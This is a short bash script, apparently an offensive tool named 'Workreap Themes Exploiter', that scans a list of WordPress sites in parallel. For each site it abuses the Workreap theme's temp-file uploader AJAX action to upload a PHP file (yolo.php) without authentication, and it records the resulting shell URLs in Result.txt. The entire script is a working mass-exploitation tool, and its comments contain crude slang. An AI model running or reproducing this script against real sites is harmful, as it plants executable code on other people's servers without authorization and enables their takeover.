#!/bin/bash 
#kontolkuda
#anjay

printf "Workreap Themes Exploiter"
printf "Coded by : kyu_kazami" 


exploit(){ 
kanjut=$1
thread=$2
merah='\e[41m'
ijo='\e[42m'

if [[ $(curl --silent --connect-timeout 10 --max-time 10 --insecure -F 'action=workreap_award_temp_file_uploader' -F award_img=@yolo.php $1'/wp-admin/admin-ajax.php') =~ '"type":"success"' ]]; then
	printf "${ijo} [Vuln] $kanjut => Success Upload !\n"
	printf "$kanjut/wp-content/uploads/workreap-temp/yolo.php\n" >> Result.txt 
	else
	printf "${merah}[Not Vuln] => $kanjut\n"
fi
} 

export -f exploit 
parallel -j $2 exploit :::: $1